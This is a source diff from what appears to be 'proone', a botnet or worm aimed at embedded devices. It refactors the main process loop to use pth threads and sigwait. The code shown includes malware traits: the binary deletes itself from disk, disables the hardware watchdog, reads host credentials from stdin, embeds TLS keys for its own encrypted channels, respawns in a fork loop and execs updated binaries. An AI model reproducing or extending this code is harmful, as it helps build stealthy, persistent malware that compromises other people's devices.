@@ -29,74 +29,26 @@
 struct prne_global prne_g;
 struct prne_shared_global *prne_s_g = NULL;
 
-static prne_worker_t resolv_wkr;
-static prne_worker_t htbt_wkr;
-static prne_worker_t* wkr_arr[2] = { NULL, NULL };
-static prne_llist_t wkr_pool;
-static void (*proc_fin_call_ptr)(void) = NULL;
-static bool finalising = false;
-static int int_pipe[2] = { -1, -1 };
-static prne_wkr_pollfd_slot_pt int_pfd = NULL;
+sigset_t ss_exit, ss_all;
 
-static void proc_fin_call (void) {
-	if (prne_g.caught_signal != 0) {
-		prne_llist_entry_t *cur = wkr_pool.head;
-		prne_worker_t *w;
+static prne_worker_t wkr_arr[2];
+static size_t wkr_cnt = 0;
 
-		prne_free_wkr_pollfd_slot(int_pfd);
-		int_pfd = NULL;
-
-		while (cur != NULL) {
-			w = (prne_worker_t*)cur->element;
-			if (!w->has_finalised(w->ctx)) {
-				w->fin(w->ctx);
-			}
-			cur = cur->next;
-		}
-
-		proc_fin_call_ptr = prne_empty_func;
-		finalising = true;
+static void alloc_workers (void) {
+	for (size_t i = 0; i < sizeof(wkr_arr)/sizeof(prne_worker_t); i += 1) {
+		prne_init_worker(wkr_arr + i);
 	}
-}
 
-static void alloc_workers (prne_wkr_sched_req_t *sched_req) {
-	prne_g.resolv = prne_alloc_resolv_worker(&resolv_wkr, sched_req, &prne_g.ssl.rnd);
-	if (prne_g.resolv != NULL) {
-		resolv_wkr.id = PRNE_RESOLV_WKR_ID;
-		wkr_arr[0] = &resolv_wkr;
-		if (prne_llist_append(&wkr_pool, &resolv_wkr) == NULL) {
-			prne_g.resolv = NULL;
-		}
-	}
+	prne_g.resolv = prne_alloc_resolv(wkr_arr + 0, &prne_g.ssl.rnd);
+	prne_assert(prne_g.resolv != NULL);
+	wkr_cnt += 1;
 }
 
 static void free_workers (void) {
-	for (size_t i = 0; i < sizeof(wkr_arr) / sizeof(prne_worker_t*); i += 1) {
-		if (wkr_arr[i] == NULL) {
-			continue;
-		}
-		wkr_arr[i]->free(wkr_arr[i]->ctx);
-		wkr_arr[i] = NULL;
+	for (size_t i = 0; i < wkr_cnt; i += 1) {
+		prne_free_worker(wkr_arr + i);
 	}
 	prne_g.resolv = NULL;
-}
-
-#ifdef PRNE_DEBUG
-static void handle_sigpipe (const int sn) {
-	// ALWAYS poll() before writing to fd!
-	abort();
-}
-#endif
-
-static void handle_sigchld (const int sn) {
-	const int saved_errno = errno;
-	pid_t reaped;
-
-	do {
-		reaped = waitpid(-1, NULL, WNOHANG);
-	} while (reaped > 0);
-
-	errno = saved_errno;
 }
 
 static void seed_ssl_rnd (const uint8_t *seed, const size_t slen) {
@@ -105,128 +57,53 @@ static void seed_ssl_rnd (const uint8_t *seed, const size_t slen) {
 	}
 }
 
+/* proone_main()
+* Actual main where all dangerous stuff happens.
+* Most of long-lived variables are declared static so there's little stack
+* allocation involvedsince stack allocation can cause page fault.
+*/
 static int proone_main (void) {
-#ifdef PRNE_DEBUG
-	static const struct timespec DBG_BUSY_CHECK_INT = { 1, 0 }; // 1s
-#endif
-	static int exit_code = 0, poll_ret;
-	static prne_wkr_tick_info_t tick_info;
-	static prne_wkr_sched_req_t sched_req;
-	static prne_llist_entry_t *cur;
-	static prne_worker_t *wkr;
-#ifdef PRNE_DEBUG
-	static struct {
-		prne_wkr_sched_req_t sched;
-		prne_wkr_timeout_slot_pt busy_tos;
-		bool sched_ret;
-	} dbg;
-#endif
+	static int caught_sig;
+	static pid_t reaped;
 
-	prne_ok_or_die(clock_gettime(CLOCK_MONOTONIC, &prne_g.child_start));
-	seed_ssl_rnd((const uint8_t*)PRNE_BUILD_ENTROPY, sizeof(PRNE_BUILD_ENTROPY));
+	prne_assert(pth_init());
+	prne_g.main_pth = pth_self();
 
-#ifdef PRNE_DEBUG
-	signal(SIGPIPE, handle_sigpipe);
-#else
+#ifndef PRNE_DEBUG
 	signal(SIGPIPE, SIG_IGN);
 #endif
-	signal(SIGCHLD, handle_sigchld);
+	seed_ssl_rnd((const uint8_t*)PRNE_BUILD_ENTROPY, sizeof(PRNE_BUILD_ENTROPY));
+	alloc_workers();
 
-#ifdef PRNE_DEBUG
-	prne_init_wkr_sched_req(&dbg.sched);
-	dbg.busy_tos = prne_alloc_wkr_timeout_slot(&dbg.sched);
-	assert(dbg.busy_tos != NULL);
-#endif
-	prne_init_wkr_sched_req(&sched_req);
-	prne_init_wkr_tick_info(&tick_info);
-	prne_init_llist(&wkr_pool);
-	alloc_workers(&sched_req);
-	int_pfd = prne_alloc_wkr_pollfd_slot(&sched_req);
-	if (int_pfd != NULL) {
-		int_pfd->pfd.fd = int_pipe[0];
-		int_pfd->pfd.events = POLLIN;
+	for (size_t i = 0; i < wkr_cnt; i += 1) {
+		wkr_arr[i].pth = pth_spawn(PTH_ATTR_DEFAULT, wkr_arr[i].entry, wkr_arr[i].ctx);
+		prne_assert(wkr_arr[i].pth != NULL);
 	}
 
-	if (wkr_pool.size == 0) {
-		exit_code = 1;
-		goto END;
+	do {
+		prne_assert(pth_sigwait(&ss_all, &caught_sig) == 0);
+		if (caught_sig == SIGCHLD) {
+			do {
+				reaped = waitpid(-1, NULL, WNOHANG);
+			} while (reaped > 0);
+			continue;
+		}
+	} while (false);
+	sigprocmask(SIG_UNBLOCK, &ss_exit, NULL);
+
+	for (size_t i = 0; i < wkr_cnt; i += 1) {
+		prne_fin_worker(wkr_arr + i);
 	}
-	if (prne_g.caught_signal != 0) {
-		goto END;
-	}
-
-	proc_fin_call_ptr = proc_fin_call;
-	prne_wkr_tick_info_set_start(&tick_info);
-	while (true) {
-		proc_fin_call_ptr();
-
-		cur = wkr_pool.head;
-		while (cur != NULL) {
-			wkr = (prne_worker_t*)cur->element;
-
-			if (wkr->has_finalised(wkr->ctx)) {
-				cur = prne_llist_erase(&wkr_pool, cur);
-			}
-			else {
-				wkr->work(wkr->ctx, &tick_info);
-				cur = cur->next;
-			}
-		}
-
-		if (wkr_pool.size == 0) {
-			exit_code = finalising ? 0 : 1;
-			break;
-		}
-
-		poll_ret = -1;
-		if (prne_wkr_sched_req_prep_poll(&sched_req)) {
-#ifdef PRNE_DEBUG
-			if (!sched_req.timeout_active && sched_req.pfd_arr_size == 0) {
-				if (!dbg.busy_tos->active) {
-					dbg.busy_tos->active = true;
-					dbg.busy_tos->dur = DBG_BUSY_CHECK_INT;
-				}
-			}
-			else {
-				dbg.busy_tos->active = false;
-			}
-			dbg.sched_ret = prne_wkr_sched_req_prep_poll(&dbg.sched);
-#endif
-			prne_wkr_sched_req_do_poll(&sched_req, &poll_ret);
-		}
-		else {
-#ifdef PRNE_DEBUG
-			dbg.busy_tos->active = false;
-			dbg.sched_ret = false;
-#endif
-		}
-		prne_wkr_tick_info_set_tick(&tick_info);
-		prne_wkr_sched_req_refl_poll(&sched_req, poll_ret, tick_info.tick_diff);
-#ifdef PRNE_DEBUG
-		if (dbg.sched_ret) {
-			prne_wkr_sched_req_refl_poll(&dbg.sched, 0, tick_info.tick_diff);
-			if (dbg.busy_tos->active && dbg.busy_tos->reached) {
-				const double real_int = prne_real_timespec(DBG_BUSY_CHECK_INT);
-				dbg.busy_tos->active = false;
-				fprintf(stderr, "* workers have been busy for %.1f second%s straight.\n", real_int, real_int <= 1.0 ? "" : "s");
-			}
-		}
-#endif
+	for (size_t i = 0; i < wkr_cnt; i += 1) {
+		prne_assert(pth_join(wkr_arr[i].pth, NULL));
+		prne_free_worker(wkr_arr + i);
 	}
 
-END:
 	free_workers();
 
-	prne_free_llist(&wkr_pool);
-	prne_free_wkr_pollfd_slot(int_pfd);
-	prne_free_wkr_tick_info(&tick_info);
-	prne_free_wkr_sched_req(&sched_req);
-#ifdef PRNE_DEBUG
-	prne_free_wkr_timeout_slot(dbg.busy_tos);
-	prne_free_wkr_sched_req(&dbg.sched);
-#endif
+	pth_kill();
 
-	return exit_code;
+	return 0;
 }
 
 static bool ensure_single_instance (void) {
@@ -291,28 +168,6 @@ static void disasble_watchdog (void) {
 #endif
 }
 
-static void handle_interrupt (const int sig) {
-	const int saved_errno = errno;
-	uint8_t rubbish = 0;
-
-	prne_g.caught_signal = sig;
-	write(int_pipe[1], &rubbish, 1);
-
-	errno = saved_errno;
-}
-
-static void setup_signal_actions (void) {
-	struct sigaction sa;
-
-	sa.sa_handler = handle_interrupt;
-	sigemptyset(&sa.sa_mask);
-	sa.sa_flags = SA_RESETHAND;
-
-	// try to exit gracefully upon reception of these signals
-	sigaction(SIGINT, &sa, NULL);
-	sigaction(SIGTERM, &sa, NULL);
-}
-
 static void read_host_credential (void) {
 	static const size_t buf_size = (1 + 2 + 255 * 2) * 4 / 3 + 2;
 	char *buf = (char*)prne_malloc(1, buf_size);
@@ -335,12 +190,15 @@ END:
 	prne_free(buf);
 }
 
-static void read_bin_archive (void) {
+static void setup_bin_archive (void) {
+	// TODO
+#if 0
 	prne_stdin_base64_rf_ctx_t rf_ctx;
 
 	prne_init_stdin_base64_rf_ctx(&rf_ctx);
 	prne_g.bin_ready = prne_index_bin_archive(&rf_ctx, prne_stdin_base64_rf, &prne_g.bin_archive).rc == PRNE_PACK_RC_OK;
 	prne_free_stdin_base64_rf_ctx(&rf_ctx);
+#endif
 }
 
 static void set_env (void) {
@@ -348,12 +206,20 @@ static void set_env (void) {
 }
 
 static void load_ssl_conf (void) {
-	if (mbedtls_x509_crt_parse(&prne_g.ssl.ca, (const uint8_t*)PRNE_X509_CA_CRT, sizeof(PRNE_X509_CA_CRT) - 1) == 0) {
+	// Could save 1108 bytes if bundled and compressed
+	static const uint8_t CA_CRT[] = PRNE_X509_CA_CRT;
+	static const uint8_t S_CRT[] = PRNE_X509_S_CRT;
+	static const uint8_t S_KEY[] = PRNE_X509_S_KEY;
+	static const uint8_t DH[] = PRNE_X509_DH;
+	static const uint8_t C_CRT[] = PRNE_X509_C_CRT;
+	static const uint8_t C_KEY[] = PRNE_X509_C_KEY;
+	
+	if (mbedtls_x509_crt_parse(&prne_g.ssl.ca, CA_CRT, sizeof(CA_CRT)) == 0) {
 		prne_g.s_ssl.ready =
 			mbedtls_ssl_config_defaults(&prne_g.s_ssl.conf, MBEDTLS_SSL_IS_SERVER, MBEDTLS_SSL_TRANSPORT_STREAM, MBEDTLS_SSL_PRESET_DEFAULT) == 0 &&
-			mbedtls_x509_crt_parse(&prne_g.s_ssl.crt, (const uint8_t*)PRNE_X509_S_CRT, sizeof(PRNE_X509_S_CRT) - 1) == 0 &&
-			mbedtls_pk_parse_key(&prne_g.s_ssl.pk, (const uint8_t*)PRNE_X509_S_KEY, sizeof(PRNE_X509_S_KEY) - 1, NULL, 0) == 0 &&
-			mbedtls_dhm_parse_dhm(&prne_g.s_ssl.dhm, (const uint8_t*)PRNE_X509_DH, sizeof(PRNE_X509_DH) - 1) == 0 &&
+			mbedtls_x509_crt_parse(&prne_g.s_ssl.crt, S_CRT, sizeof(S_CRT)) == 0 &&
+			mbedtls_pk_parse_key(&prne_g.s_ssl.pk, S_KEY, sizeof(S_KEY), NULL, 0) == 0 &&
+			mbedtls_dhm_parse_dhm(&prne_g.s_ssl.dhm, DH, sizeof(DH)) == 0 &&
 			mbedtls_ssl_conf_own_cert(&prne_g.s_ssl.conf, &prne_g.s_ssl.crt, &prne_g.s_ssl.pk) == 0 &&
 			mbedtls_ssl_conf_dh_param_ctx(&prne_g.s_ssl.conf, &prne_g.s_ssl.dhm) == 0;
 		if (prne_g.s_ssl.ready) {
@@ -366,8 +232,8 @@ static void load_ssl_conf (void) {
 
 		prne_g.c_ssl.ready =
 			mbedtls_ssl_config_defaults(&prne_g.c_ssl.conf, MBEDTLS_SSL_IS_SERVER, MBEDTLS_SSL_TRANSPORT_STREAM, MBEDTLS_SSL_PRESET_DEFAULT) == 0 &&
-			mbedtls_x509_crt_parse(&prne_g.c_ssl.crt, (const uint8_t*)PRNE_X509_C_CRT, sizeof(PRNE_X509_C_CRT) - 1) == 0 &&
-			mbedtls_pk_parse_key(&prne_g.c_ssl.pk, (const uint8_t*)PRNE_X509_C_KEY, sizeof(PRNE_X509_C_KEY) - 1, NULL, 0) == 0 &&
+			mbedtls_x509_crt_parse(&prne_g.c_ssl.crt, C_CRT, sizeof(C_CRT)) == 0 &&
+			mbedtls_pk_parse_key(&prne_g.c_ssl.pk, C_KEY, sizeof(C_KEY), NULL, 0) == 0 &&
 			mbedtls_ssl_conf_own_cert(&prne_g.c_ssl.conf, &prne_g.c_ssl.crt, &prne_g.c_ssl.pk) == 0;
 		if (prne_g.c_ssl.ready) {
 			mbedtls_ssl_conf_ca_chain(&prne_g.c_ssl.conf, &prne_g.ssl.ca, NULL);
@@ -381,11 +247,17 @@ static void load_ssl_conf (void) {
 
 static void init_shared_global (void) {
 	// just die on error
-	const size_t str_len = 1 + 30;
+	static const size_t str_len = 1 + 30;
 	int fd;
-	char *name;
+	char name[str_len];
 
-	name = prne_malloc(1, str_len + 1);
+	/* TODO
+	* 1. Try anonymous mmap()
+	* 2. Try opening /dev/zero
+	* 3. Try creating and opening /tmp/...
+	* 4. Try creating and opening random file in current wd
+	* 5. ... just don't use shared memory if all of these fail
+	*/
 	name[0] = '/';
 	name[str_len] = 0;
 	prne_rnd_anum_str(&prne_g.ssl.rnd, name + 1, str_len - 1);
@@ -395,7 +267,6 @@ static void init_shared_global (void) {
 		abort();
 	}
 	shm_unlink(name);
-	prne_free(name);
 
 	if (ftruncate(fd, sizeof(struct prne_shared_global)) < 0) {
 		abort();
@@ -445,13 +316,21 @@ static void run_ny_bin (void) {
 
 int main (const int argc, char **args) {
 	static int exit_code = 0;
+	static bool loop = true;
+
+	sigemptyset(&ss_exit);
+	sigemptyset(&ss_all);
+	sigaddset(&ss_exit, SIGINT);
+	sigaddset(&ss_exit, SIGTERM);
+	sigaddset(&ss_all, SIGINT);
+	sigaddset(&ss_all, SIGTERM);
+	sigaddset(&ss_all, SIGCHLD);
 
 	prne_g.host_cred_data = NULL;
 	prne_g.host_cred_size = 0;
-	prne_ok_or_die(clock_gettime(CLOCK_MONOTONIC, &prne_g.parent_start));
+	prne_g.parent_start = prne_gettime(CLOCK_MONOTONIC);
 	prne_g.run_cnt = 0;
 	prne_g.resolv = NULL;
-	prne_g.caught_signal = 0;
 	prne_g.parent_pid = getpid();
 	prne_g.child_pid = 0;
 	prne_g.lock_shm_fd = -1;
@@ -483,15 +362,16 @@ int main (const int argc, char **args) {
 	delete_myself(args[0]);
 	disasble_watchdog();
 
-	// load data from stdin
-	read_host_credential();
-	read_bin_archive();
-
 	if (!ensure_single_instance()) {
+		prne_dbgpf("*** ensure_single_instance() returned false.");
 		exit_code = 1;
 		goto END;
 	}
 
+	setup_bin_archive();
+	// load data from stdin
+	read_host_credential();
+	
 	// done with the terminal
 	prne_close(STDIN_FILENO);
 	prne_close(STDOUT_FILENO);
@@ -499,17 +379,10 @@ int main (const int argc, char **args) {
 	prne_close(STDERR_FILENO);
 #endif
 
-	if (pipe(int_pipe) == 0) {
-		prne_set_pipe_size(int_pipe[0], 1);
-		prne_ok_or_die(fcntl(int_pipe[0], F_SETFL, O_NONBLOCK));
-		prne_ok_or_die(fcntl(int_pipe[1], F_SETFL, O_NONBLOCK));
-		prne_ok_or_die(fcntl(int_pipe[0], F_SETFD, FD_CLOEXEC));
-		prne_ok_or_die(fcntl(int_pipe[1], F_SETFD, FD_CLOEXEC));
-	}
-	setup_signal_actions();
+	sigprocmask(SIG_BLOCK, &ss_all, NULL);
 
 	// main loop
-	while (prne_g.caught_signal == 0) {
+	while (loop) {
 		prne_g.child_pid = fork();
 
 		if (prne_g.child_pid >= 0) {
@@ -519,38 +392,43 @@ int main (const int argc, char **args) {
 		if (prne_g.child_pid > 0) {
 			static int status;
 			static bool has_ny_bin;
+			static int caught_signal = 0;
 
-			while (prne_g.caught_signal == 0) {
-				if (waitpid(prne_g.child_pid, &status, 0) < 0) {
-					if (errno != EINTR) {
-						abort();
-					}
-					else {
-						continue;
-					}
+			status = 0; // FIXME: libc bug?
+
+			do {
+				prne_assert(sigwait(&ss_all, &caught_signal) == 0);
+
+				switch (caught_signal) {
+				case SIGINT:
+				case SIGTERM:
+					// pass the signal to the child
+					loop = false;
+					sigprocmask(SIG_UNBLOCK, &ss_exit, NULL);
+					kill(prne_g.child_pid, caught_signal);
+					continue;
+				case SIGCHLD:
+					prne_assert(waitpid(prne_g.child_pid, &status, WNOHANG) == prne_g.child_pid);
+					break;
 				}
-				break;
-			}
+			} while (false);
 
 			has_ny_bin = strlen(prne_s_g->ny_bin_name) > 0;
 
 			if (WIFEXITED(status)) {
+				prne_dbgpf("* child process %d exited with code %d!\n", prne_g.child_pid, WEXITSTATUS(status));
 				if (WEXITSTATUS(status) == 0) {
 					if (has_ny_bin) {
+						prne_dbgpf("* detected new bin. Attempting to exec()\n");
 						run_ny_bin();
 						// run_ny_bin() returns if fails
+						prne_dbgperr("** run_ny_bin() failed");
 					}
 					break;
 				}
-
-#ifdef PRNE_DEBUG
-				fprintf(stderr, "* child process %d exited with code %d!\n", prne_g.child_pid, WEXITSTATUS(status));
-#endif
 			}
 			else if (WIFSIGNALED(status)) {
-#ifdef PRNE_DEBUG
-				fprintf(stderr, "* child process %d received signal %d!\n", prne_g.child_pid, WTERMSIG(status));
-#endif
+				prne_dbgpf("** child process %d received signal %d!\n", prne_g.child_pid, WTERMSIG(status));
 			}
 
 			if (has_ny_bin) {
@@ -564,6 +442,7 @@ int main (const int argc, char **args) {
 			prne_close(prne_g.lock_shm_fd);
 			prne_g.lock_shm_fd = -1;
 			prne_g.is_child = true;
+			prne_g.child_start = prne_gettime(CLOCK_MONOTONIC);
 		
 			exit_code = proone_main();
 			break;
